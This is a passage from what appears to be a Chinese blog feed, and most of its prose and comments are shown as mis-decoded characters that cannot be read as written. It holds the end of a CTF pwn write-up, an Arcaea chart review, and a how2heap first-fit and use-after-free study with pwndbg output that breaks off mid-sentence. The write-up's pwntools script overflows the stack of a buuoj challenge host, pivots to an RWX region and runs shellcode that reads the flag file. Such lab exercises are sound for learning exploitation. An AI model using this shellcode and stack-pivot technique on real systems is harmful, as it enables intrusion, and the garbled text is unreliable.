class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå­˜åœ¨æ ˆæº¢å‡ºï¼Œæ„Ÿè§‰å¯ä»¥æ‰“ shellcodeï¼Œä½†æ˜¯ï¼Œæ˜æ˜¾å‘ç°æ ˆçš„é•¿åº¦ä¸å¤Ÿ ret2shellcodeï¼Œæ¨æµ‹ä¸€æ‰‹æ ˆè¿ç§»ï¼Œè¯•è¯•çœ‹ã€‚</p><p>â€‹ç»è¿‡åŠ¨è°ƒä¹‹åï¼Œå‘ç°åœ¨æ‰§è¡Œåˆ°å‡½æ•° mmap ä¹‹åï¼Œå­˜åœ¨ä¸€ä¸ªå¯å†™å¯æ‰§è¡Œæƒé™çš„å†…å­˜æ®µï¼ˆæ‰”ä¸€ä¸ªå°çŸ¥è¯†ç‚¹ï¼šè¿™é‡Œ mmap å‚æ•°ç±»å‹æ˜¯ï¼ˆèµ·å§‹åœ°å€ï¼Œå¤§å°ï¼Œä¿æŠ¤ç±»ï¼Œæ–‡ä»¶æè¿°ç¬¦] ç­‰ï¼‰ï¼‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">          0x123000           0x124000 -wxp     1000      0 [anon_00123]</span><br></pre></td></tr></table></figure><p>â€‹å¯ä»¥å°†æ ˆè¿ç§»åˆ°è¿™å„¿å»ï¼Œå†æ‰§è¡Œ shellcode æˆ–è€… syscall è¯»æ–‡ä»¶ï¼Œä¸è¿‡ï¼Œè¿™ä¸ªè¦ä¹‹åå†è¯´äº†ã€‚å¤§æ¦‚æ€è·¯è¯´ä¸‹å§ï¼Œå…ˆé€šè¿‡ shellcode è°ƒç”¨ read å‡½æ•°å°†è¯»æ–‡ä»¶å†™å…¥å†…å­˜ç„¶åè¾“å‡ºè¿™æ ·çš„ä¸€ä¸ªé¡ºåºï¼Œå…ˆè´´ä¸€ä¸‹ expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span></span><br><span class="line">Locale = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> Locale == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26888</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#elf = ELF(&quot;./pwn&quot;)</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># gdb.attach(io)</span></span><br><span class="line">    mnap = <span class="number">0x123000</span></span><br><span class="line">    jmp_rsp = <span class="number">0x0400a01</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Easy shellcode, have fun!\n&quot;</span>)</span><br><span class="line">    shellcode = asm(shellcraft.read(<span class="number">0</span>,mnap,<span class="number">0x100</span>))</span><br><span class="line">    shellcode += asm(<span class="string">&#x27;mov rax,0x123000;call rax&#x27;</span>)</span><br><span class="line">    payload = shellcode.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(jmp_rsp)+asm(<span class="string">&quot;sub rsp,0x30;jmp rsp&quot;</span>)<span class="comment">#è¿™é‡Œçš„å‡0x30æˆ‘æ²¡æ€ä¹ˆçœ‹æ‡‚ï¼Œè®°å½•åœ¨è¿™å„¿</span></span><br><span class="line">    io.send(payload)</span><br><span class="line">    payload2 = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)+shellcraft.read(<span class="number">3</span>,mnap+<span class="number">0x100</span>,<span class="number">0x100</span>)+shellcraft.write(<span class="number">1</span>,mnap+<span class="number">0x100</span>,<span class="number">0x100</span>))</span><br><span class="line">    io.send(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>â€‹</p><h1 id="å‚è€ƒæ–‡ç« "><a class="markdownIt-Anchor" href="#å‚è€ƒæ–‡ç« ">#</a> å‚è€ƒæ–‡ç« ï¼š</h1><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTDBnNG4tYmxvZy9wLzEyODM5MTcxLmh0bWw=">ä» prctl å‡½æ•°å¼€å§‹å­¦ä¹ æ²™ç®±è§„åˆ™</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21yaGVzb25nemUvYXJ0aWNsZS9kZXRhaWxzLzEwMzAwODkyNQ==">BPF è¯¦è§£</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x2eHU2NjYvYXJ0aWNsZS9kZXRhaWxzLzEzMDgyMTMzMA==">å‡½æ•° prctl ç³»ç»Ÿè°ƒç”¨</span></p>]]></content>
      
      
      <categories>
          
          <category> Pwnæ‰‹çš„è‡ªæˆ‘ä¿®å…» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>arcaeaé—²è°ˆ</title>
      <link href="/posts/ef2fddc9.html"/>
      <url>/posts/ef2fddc9.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-å…³äºæˆ‘å¯¹è¿™äº›è°±é¢çš„è¯„ä»·"><a class="markdownIt-Anchor" href="#1-å…³äºæˆ‘å¯¹è¿™äº›è°±é¢çš„è¯„ä»·">#</a> 1ã€å…³äºæˆ‘å¯¹è¿™äº›è°±é¢çš„è¯„ä»·ï¼š</h1><p>â€‹æˆ‘åªä¼šæŒ‘ä¸€äº›æˆ‘å°è±¡æ¯”è¾ƒæ·±çš„è°±é¢æ¥è¯´ã€‚</p><h2 id="19"><a class="markdownIt-Anchor" href="#19">#</a> &lt;1&gt;9+ï¼š</h2><h3 id="1sulferç¡«ç£º"><a class="markdownIt-Anchor" href="#1sulferç¡«ç£º">#</a> ï¼ˆ1ï¼‰sulferï¼ˆç¡«ç£ºï¼‰ï¼š</h3><p>â€‹<img data-src="https://gitee.com/gou-dengyue/images/raw/master/IMG_1343.PNG" alt="IMG_1343"></p><p>â€‹9 + é¦– pm çš„æ­Œï¼Œç¥è°±æ— éœ€å¤šè¨€ï¼Œå¤§é‡çš„åœ°é¢äº¤äº’ä»¥åŠå¤©åœ°äº¤äº’è™½ç„¶ç»™ä¸å°‘èŠ±ç´«äººå¸¦æ¥äº†å·¨å¤§çš„æŒ‘æˆ˜ï¼Œä½†æ˜¯ï¼Œèº«ä¸ºä¸€é¦– 9+ï¼Œå®ƒç»™æˆ‘ä»¬å¸¦æ¥çš„ä¸åªæ˜¯äº¤äº’åŠ›çš„æå‡ï¼Œè¿˜æœ‰ä»»æˆ‘ä»¬ç–¯ç‹‚å‹æ¦¨çš„ pttï¼Œåœ¨æˆ‘èŠ±ç´«ä»¥åŠçº¢æ¡†æ—¶æœŸï¼Œè¿™è°±ç»™æˆ‘çš„ ptt å¸¦æ¥äº†è‡³å°‘ 0.2 çš„æå‡å¦¥å¦¥çš„æ¦¨æ±æœºã€‚</p><h2 id="210"><a class="markdownIt-Anchor" href="#210">#</a> &lt;2&gt;10ï¼š</h2><h3 id="1sheriruthé»‘é­”ç‹"><a class="markdownIt-Anchor" href="#1sheriruthé»‘é­”ç‹">#</a> ï¼ˆ1ï¼‰sheriruthï¼ˆé»‘é­”ç‹)ï¼š</h3><p><img data-src="https://gitee.com/gou-dengyue/images/raw/master/IMG_1345.PNG" alt=""></p><p>â€‹è°±ç¡®å®ä¸é”™ï¼Œä½†æ˜¯ï¼Œè€ä¸ä½æˆ‘åœ¨èŠ±ç´«ç”šè‡³æ²¡åˆ°èŠ±ç´«çš„æ—¶å€™é«˜å¼ºåº¦è¶Šçº§å¯¼è‡´äº†æ‰‹ç™–ï¼Œæœ€åä¸€ç›´æ”¶ä¸äº†ã€‚</p><p>â€‹æ€»çš„æ¥è¯´ä¸‹å§ï¼Œå‰é¢çš„äº¤äº’å¾ˆä¸é”™ï¼Œè¦æ±‚ä¸€å®šçš„åè°ƒæ€§ï¼Œä»¥åŠè¦æ±‚ä¸€å®šçš„åº•åŠ›ã€‚åœ¨æˆ‘ä¸¥é‡æ‰‹ç™–çš„æƒ…å†µä¸‹æ„Ÿè§‰å°¾æ€ç¨å¾®æœ‰ç‚¹è„‘è£‚ä»¥å¤–ï¼Œå…¶ä»–çš„æ•´ä½“å¾ˆä¸é”™ï¼Œç¥è°±ã€‚</p><h3 id="2"><a class="markdownIt-Anchor" href="#2">#</a> ï¼ˆ2ï¼‰</h3><h2 id="310"><a class="markdownIt-Anchor" href="#310">#</a> &lt;3&gt;10+ï¼š</h2><h3 id="1cyaeghaç»¿é­”ç‹"><a class="markdownIt-Anchor" href="#1cyaeghaç»¿é­”ç‹">#</a> ï¼ˆ1ï¼‰Cyaeghaï¼ˆç»¿é­”ç‹ï¼‰ï¼š</h3><p><img data-src="https://gitee.com/gou-dengyue/images/raw/master/IMG_1127.PNG" alt="IMG_1127"></p><p>â€‹ç¥è°±ã€‚å‰é¢åŒæŠ¼æµ·è™½ç„¶å¾ˆè®©äººè„‘è£‚ï¼Œä½†æ˜¯ï¼Œåªè¦ä¹ æƒ¯å¤–åŠ èƒŒè°±æ¥æ‰“çš„è¯ï¼Œå°±ä¼šå‘ç°ï¼Œå¹¶æ²¡æœ‰é‚£ä¹ˆéš¾äº†ï¼Œå¹¶ä¸”è¿™è°±åé¢çˆ½åˆ°æè‡´ï¼Œå°¾æ€éƒ¨åˆ†éš¾åº¦ç”šè‡³æ„Ÿè§‰ä¸å¦‚æŸäº› 10.0ï¼Œçº¯çº¯çš„çˆ½è°±ï¼Œåœ¨çˆ½è°±ä¸­æ’åå‰åˆ—ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å‘ç”µæ—¥å¸¸ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Daily life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>how2heap_zh</title>
      <link href="/posts/2c0210e1.html"/>
      <url>/posts/2c0210e1.html</url>
      
        <content type="html"><![CDATA[<p>â€‹ç”±äº Pwn çš„å †æ–¹å‘æ„Ÿè§‰å¼‚å¸¸æŠ½è±¡ï¼Œæ‰€ä»¥ï¼Œæˆ‘æƒ³ç€é€šè¿‡ how2heap è¿™ä¸ªé¡¹ç›®æ¥å…¥é—¨ heapã€‚ä½†æ˜¯ï¼Œç”±äºæœ‰çš„ç¨‹åºä¸çŸ¥ä¸ºä½•è°ƒè¯•æ€»æ˜¯å‡ºé—®é¢˜ï¼Œä¸è¿‡ï¼Œæˆ‘ä¼šæ…¢æ…¢æ¥è§£å†³çš„ï¼Œæ‰€ä»¥è¿™ä¸ªæ–‡ç« ä¹Ÿæ˜¯å¤„äºæ…¢æ…¢æ›´æ–°çš„çŠ¶æ€ã€‚</p><p>â€‹glibc ç‰ˆæœ¬ï¼šæœ€æ–°</p><p>â€‹æºç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;å°½ç®¡è¿™ä¸ªä¾‹å­æ²¡æœ‰æ¼”ç¤ºæ”»å‡»æ•ˆæœï¼Œä½†æ˜¯å®ƒæ¼”ç¤ºäº† glibc çš„åˆ†é…æœºåˆ¶\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;glibc ä½¿ç”¨é¦–æ¬¡é€‚åº”ç®—æ³•é€‰æ‹©ç©ºé—²çš„å †å—\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;å¦‚æœæœ‰ä¸€ä¸ªç©ºé—²å †å—ä¸”è¶³å¤Ÿå¤§ï¼Œé‚£ä¹ˆ malloc å°†é€‰æ‹©å®ƒ\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;å¦‚æœå­˜åœ¨ use-after-free çš„æƒ…å†µé‚£å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‰¹æ€§\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;é¦–å…ˆç”³è¯·ä¸¤ä¸ªæ¯”è¾ƒå¤§çš„ chunk\n&quot;</span>);</span><br><span class="line">    <span class="type">char</span>* a = <span class="built_in">malloc</span>(<span class="number">0x512</span>);</span><br><span class="line">    <span class="type">char</span>* b = <span class="built_in">malloc</span>(<span class="number">0x256</span>);</span><br><span class="line">    <span class="type">char</span>* c;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ç¬¬ä¸€ä¸ª a = malloc(0x512) åœ¨: %p\n&quot;</span>, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ç¬¬äºŒä¸ª a = malloc(0x256) åœ¨: %p\n&quot;</span>, b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;æˆ‘ä»¬å¯ä»¥ç»§ç»­åˆ†é…\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ç°åœ¨æˆ‘ä»¬æŠŠ \&quot;AAAAAAAA\&quot; è¿™ä¸ªå­—ç¬¦ä¸²å†™åˆ° a é‚£é‡Œ \n&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(a, <span class="string">&quot;AAAAAAAA&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ç¬¬ä¸€æ¬¡ç”³è¯·çš„ %p æŒ‡å‘ %s\n&quot;</span>, a, a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;æ¥ä¸‹æ¥ free æ‰ç¬¬ä¸€ä¸ª...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;æ¥ä¸‹æ¥åªè¦æˆ‘ä»¬ç”³è¯·ä¸€å—å°äº 0x512 çš„ chunkï¼Œé‚£å°±ä¼šåˆ†é…åˆ°åŸæœ¬ a é‚£é‡Œ: %p\n&quot;</span>, a);</span><br><span class="line"></span><br><span class="line">    c = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ç¬¬ä¸‰æ¬¡ c = malloc(0x500) åœ¨: %p\n&quot;</span>, c);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;æˆ‘ä»¬è¿™æ¬¡å¾€é‡Œå†™ä¸€ä¸² \&quot;CCCCCCCC\&quot; åˆ°åˆšç”³è¯·çš„ c ä¸­\n&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(c, <span class="string">&quot;CCCCCCCC&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ç¬¬ä¸‰æ¬¡ç”³è¯·çš„ c %p æŒ‡å‘ %s\n&quot;</span>, c, c);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ç¬¬ä¸€æ¬¡ç”³è¯·çš„ a %p æŒ‡å‘ %s\n&quot;</span>, a, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;å¯ä»¥çœ‹åˆ°ï¼Œè™½ç„¶æˆ‘ä»¬åˆšåˆšçœ‹çš„æ˜¯ a çš„ï¼Œä½†å®ƒçš„å†…å®¹å´æ˜¯ \&quot;CCCCCCCC\&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ç¼–è¯‘ä¸€ä¸‹ï¼š <code>gcc -g first_fit.c</code></p><p>â€‹è¿è¡Œä¸€ä¸‹çœ‹çœ‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~/Temp$ ./heap</span><br><span class="line">å°½ç®¡è¿™ä¸ªä¾‹å­æ²¡æœ‰æ¼”ç¤ºæ”»å‡»æ•ˆæœï¼Œä½†æ˜¯å®ƒæ¼”ç¤ºäº† glibc çš„åˆ†é…æœºåˆ¶</span><br><span class="line">glibc ä½¿ç”¨é¦–æ¬¡é€‚åº”ç®—æ³•é€‰æ‹©ç©ºé—²çš„å †å—</span><br><span class="line">å¦‚æœæœ‰ä¸€ä¸ªç©ºé—²å †å—ä¸”è¶³å¤Ÿå¤§ï¼Œé‚£ä¹ˆ malloc å°†é€‰æ‹©å®ƒ</span><br><span class="line">å¦‚æœå­˜åœ¨ use-after-free çš„æƒ…å†µé‚£å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‰¹æ€§</span><br><span class="line">é¦–å…ˆç”³è¯·ä¸¤ä¸ªæ¯”è¾ƒå¤§çš„ chunk</span><br><span class="line">ç¬¬ä¸€ä¸ª a = malloc(0x512) åœ¨: 0x5595c3a182a0</span><br><span class="line">ç¬¬äºŒä¸ª a = malloc(0x256) åœ¨: 0x5595c3a187c0</span><br><span class="line">æˆ‘ä»¬å¯ä»¥ç»§ç»­åˆ†é…</span><br><span class="line">ç°åœ¨æˆ‘ä»¬æŠŠ <span class="string">&quot;AAAAAAAA&quot;</span> è¿™ä¸ªå­—ç¬¦ä¸²å†™åˆ° a é‚£é‡Œ</span><br><span class="line">ç¬¬ä¸€æ¬¡ç”³è¯·çš„ 0x5595c3a182a0 æŒ‡å‘ AAAAAAAA</span><br><span class="line">æ¥ä¸‹æ¥ free æ‰ç¬¬ä¸€ä¸ª...</span><br><span class="line">æ¥ä¸‹æ¥åªè¦æˆ‘ä»¬ç”³è¯·ä¸€å—å°äº 0x512 çš„ chunkï¼Œé‚£å°±ä¼šåˆ†é…åˆ°åŸæœ¬ a é‚£é‡Œ: 0x5595c3a182a0</span><br><span class="line">ç¬¬ä¸‰æ¬¡ c = malloc(0x500) åœ¨: 0x5595c3a182a0</span><br><span class="line">æˆ‘ä»¬è¿™æ¬¡å¾€é‡Œå†™ä¸€ä¸² <span class="string">&quot;CCCCCCCC&quot;</span> åˆ°åˆšç”³è¯·çš„ c ä¸­</span><br><span class="line">ç¬¬ä¸‰æ¬¡ç”³è¯·çš„ c 0x5595c3a182a0 æŒ‡å‘ CCCCCCCC</span><br><span class="line">ç¬¬ä¸€æ¬¡ç”³è¯·çš„ a 0x5595c3a182a0 æŒ‡å‘ CCCCCCCC</span><br><span class="line">å¯ä»¥çœ‹åˆ°ï¼Œè™½ç„¶æˆ‘ä»¬åˆšåˆšçœ‹çš„æ˜¯ a çš„ï¼Œä½†å®ƒçš„å†…å®¹å´æ˜¯ <span class="string">&quot;CCCCCCCC&quot;</span></span><br></pre></td></tr></table></figure><p>â€‹å¼€å§‹è°ƒè¯•ï¼š</p><p>â€‹é¦–å…ˆï¼Œæœ€å¼€å§‹ï¼Œåœ¨ç¬¬ä¸€æ¬¡ malloc åˆ†é…å†…å­˜ä¹‹å‰ï¼Œä½¿ç”¨ vmmap æŸ¥çœ‹å†…å­˜å¸ƒå±€ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">    0x555555554000     0x555555555000 r--p     1000      0 /home/g01den/Temp/how2heap/first</span><br><span class="line">    0x555555555000     0x555555556000 r-xp     1000   1000 /home/g01den/Temp/how2heap/first</span><br><span class="line">    0x555555556000     0x555555557000 r--p     1000   2000 /home/g01den/Temp/how2heap/first</span><br><span class="line">    0x555555557000     0x555555558000 r--p     1000   2000 /home/g01den/Temp/how2heap/first</span><br><span class="line">    0x555555558000     0x555555559000 rw-p     1000   3000 /home/g01den/Temp/how2heap/first</span><br><span class="line">    0x7ffff7dcb000     0x7ffff7ded000 r--p    22000      0 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7ded000     0x7ffff7f65000 r-xp   178000  22000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7f65000     0x7ffff7fb3000 r--p    4e000 19a000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7fb3000     0x7ffff7fb7000 r--p     4000 1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7fb7000     0x7ffff7fb9000 rw-p     2000 1eb000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7fb9000     0x7ffff7fbf000 rw-p     6000      0 [anon_7ffff7fb9]</span><br><span class="line">    0x7ffff7fc9000     0x7ffff7fcd000 r--p     4000      0 [vvar]</span><br><span class="line">    0x7ffff7fcd000     0x7ffff7fcf000 r-xp     2000      0 [vdso]</span><br><span class="line">    0x7ffff7fcf000     0x7ffff7fd0000 r--p     1000      0 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7fd0000     0x7ffff7ff3000 r-xp    23000   1000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ff3000     0x7ffff7ffb000 r--p     8000  24000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  2c000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  2d000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]</span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]</span><br></pre></td></tr></table></figure><p>â€‹æ˜æ˜¾ï¼Œè¿™é‡Œä¸å­˜åœ¨ heap æ®µï¼Œè¿›è¡Œ malloc ä¹‹åï¼Œå‘ç°å¤šå‡ºæ¥äº†ä¸ª heap æ®µï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">    0x555555554000     0x555555555000 r--p     1000      0 /home/g01den/Temp/how2heap/first</span><br><span class="line">    0x555555555000     0x555555556000 r-xp     1000   1000 /home/g01den/Temp/how2heap/first</span><br><span class="line">    0x555555556000     0x555555557000 r--p     1000   2000 /home/g01den/Temp/how2heap/first</span><br><span class="line">    0x555555557000     0x555555558000 r--p     1000   2000 /home/g01den/Temp/how2heap/first</span><br><span class="line">    0x555555558000     0x555555559000 rw-p     1000   3000 /home/g01den/Temp/how2heap/first</span><br><span class="line">    0x555555559000     0x55555557a000 rw-p    21000      0 [heap]</span><br><span class="line">    0x7ffff7dcb000     0x7ffff7ded000 r--p    22000      0 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7ded000     0x7ffff7f65000 r-xp   178000  22000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7f65000     0x7ffff7fb3000 r--p    4e000 19a000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7fb3000     0x7ffff7fb7000 r--p     4000 1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7fb7000     0x7ffff7fb9000 rw-p     2000 1eb000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7fb9000     0x7ffff7fbf000 rw-p     6000      0 [anon_7ffff7fb9]</span><br><span class="line">    0x7ffff7fc9000     0x7ffff7fcd000 r--p     4000      0 [vvar]</span><br><span class="line">    0x7ffff7fcd000     0x7ffff7fcf000 r-xp     2000      0 [vdso]</span><br><span class="line">    0x7ffff7fcf000     0x7ffff7fd0000 r--p     1000      0 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7fd0000     0x7ffff7ff3000 r-xp    23000   1000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ff3000     0x7ffff7ffb000 r--p     8000  24000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  2c000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  2d000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]</span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]</span><br></pre></td></tr></table></figure><p>â€‹å…ˆæŸ¥çœ‹ä¸‹ chunk 